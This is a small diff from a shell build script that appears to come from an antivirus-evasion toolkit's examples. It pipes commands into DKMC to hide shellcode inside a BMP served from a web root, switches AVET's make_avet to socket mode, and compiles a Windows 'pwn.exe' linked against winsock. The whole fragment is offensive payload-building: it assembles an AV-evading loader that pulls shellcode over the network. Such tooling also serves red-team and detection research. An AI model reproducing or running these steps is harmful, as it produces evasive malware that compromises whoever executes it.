@@ -11,7 +11,7 @@ cd ../DKMC
 printf "gen\nset output /var/www/html/sc.bmp\nset shellcode $x\nrun\nexit\nexit\n" | python dkmc.py
 cd ../avet
 # call make_avet, compile 
-./make_avet -d
+./make_avet -d sock
 $win32_compiler -s -o pwn.exe avet.c  -lwsock32 -lWs2_32
 # cleanup
 echo "" > defs.h
